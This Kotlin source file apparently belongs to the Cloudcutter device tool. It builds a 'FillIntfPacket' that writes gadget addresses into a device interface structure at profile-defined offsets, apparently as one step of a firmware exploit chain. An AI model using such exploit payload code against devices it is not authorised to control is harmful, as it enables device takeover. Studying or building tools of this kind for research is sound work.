/*
 * Copyright (c) Kuba Szczodrzyński 2022-11-1.
 */

package io.github.cloudcutter.work.protocol.proper

import io.github.cloudcutter.data.model.ProfileLightleak
import io.github.cloudcutter.data.model.ProfileLightleakDataN
import io.github.cloudcutter.data.model.ProfileLightleakDataT
import io.github.cloudcutter.work.protocol.buildByteArray
import java.nio.ByteBuffer
import java.nio.ByteOrder

class FillIntfPacket(
	profile: ProfileLightleak.Data,
	requestId: Int,
) : ProperPacket(profile, requestId) {

	override val action = 0x10
	override val properData by lazy {
		val gadgets = getGadgetAddresses()
		return@lazy buildByteArray(
			size = 4 + gadgets.size,
			gadgets.size / 4,
			gadgets,
		)
	}

	private fun getGadgetAddresses(): ByteArray {
		val intfSize = when (profile) {
			is ProfileLightleakDataT -> profile.gadgets.mapNotNull { it.intfOffset }.max().plus(4)
			is ProfileLightleakDataN -> profile.gadgets.mapNotNull { it.intfOffset }.max().plus(4)
			else -> return byteArrayOf()
		}

		val intf = ByteBuffer.allocate(intfSize - 4) // do not allocate intf->search_performed
		intf.order(ByteOrder.LITTLE_ENDIAN)
		when (profile) {
			is ProfileLightleakDataN -> {
				for (gadget in profile.gadgets) {
					if (gadget.intfOffset == null)
						continue
					intf.position(gadget.intfOffset - 4)
					intf.putInt(gadget.address)
				}
			}
		}
		return intf.array()
	}
}
